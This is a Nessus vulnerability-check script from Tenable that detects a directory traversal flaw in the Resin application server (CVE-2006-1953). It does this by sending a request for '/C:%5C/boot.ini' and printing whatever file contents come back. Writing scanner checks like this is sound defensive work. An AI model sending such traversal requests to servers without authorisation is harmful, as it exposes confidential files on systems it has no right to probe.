#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is prone to directory traversal attacks. 

Description :

The remote host is running Resin, an application server. 

The installation of Resin on the remote host allows an unauthenticated
remote attacker to gain access to any file on the affected Windows
host, which may lead to a loss of confidentiality. 

See also :

http://www.securityfocus.com/archive/1/434150/30/0/threaded
http://www.caucho.com/download/changes.xtp

Solution :

Upgrade to Resin 3.0.19 or later. 

Risk factor : 

Low / CVSS Base Score : 3.3
(AV:R/AC:L/Au:NR/C:C/I:N/A:N/B:N)";


if (description)
{
  script_id(21606);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1953");
  script_bugtraq_id(18005);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"25570");

  script_name(english:"Resin Directory Traversal Vulnerability");
  script_summary(english:"Tries to retrieve boot.ini using Resin");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# Make sure the banner is from Resin.
banner = get_http_banner(port:port);
if (!banner || "Resin/" >!< banner) exit(0);


# Try to exploit the issue to get a file.
file = "boot.ini";
req = http_get(item:string("/C:%5C/", file), port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if looks like boot.ini.
if ("[boot loader]">< res)
{
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_note(port:port, data:report);
}
